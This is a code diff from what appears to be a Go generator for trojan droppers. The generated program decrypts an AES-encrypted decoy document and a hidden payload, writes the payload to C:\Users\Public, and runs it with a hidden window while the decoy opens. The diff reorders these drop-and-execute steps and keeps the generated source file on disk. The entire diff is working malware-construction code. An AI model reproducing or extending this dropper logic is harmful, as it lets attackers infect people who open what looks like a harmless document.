@@ -85,13 +85,8 @@ func main() {
 	func main() {
 	
 		selfile, _ := os.Executable()
-		numafile := "%s"
 	
 		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
-		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
-		dmumafile := AesDecrypt(numafile, key)
-		_, _ = f.Write([]byte(dmumafile))
-		f.Close()
 		docfile := "%s"
 		ddocfile := AesDecrypt(docfile, key)
 		f2, _ := os.Create(docfilename)
@@ -102,10 +97,20 @@ func main() {
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		//cmd2.Stdout = os.Stdout
 		_ = cmd.Start()
-		cmd2 := exec.Command("C:\\Users\\Public\\" + mumafilename)
-		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		//cmd2.Stdout = os.Stdout
-		_ = cmd2.Start()
+		numafile := "%s"
+		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
+		dmumafile := AesDecrypt(numafile, key)
+		_, _ = f.Write([]byte(dmumafile))
+		f.Close()
+		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
+		_, err := os.Stat(dstFilecc)
+	
+		if err == nil {
+	
+			cmda := exec.Command(dstFilecc)
+			_ = cmda.Start()
+	
+		}
 	
 	}
 	
@@ -125,7 +130,6 @@ func main() {
 		orig = PKCS7UnPadding(orig)
 		return string(orig)
 	}
-	
 
 	`, key, mumafile, docfile, "\\\\"+docfile, AesmumafileStr, AesdocfileStr)
 
@@ -147,7 +151,7 @@ func main() {
 	_ = cmd.Start()
 
 	exitfile("outfile.exe")
-	os.RemoveAll("outfile.go")
+	//os.RemoveAll("outfile.go")
 	os.RemoveAll("Yihsiwei.bat")
 
 }
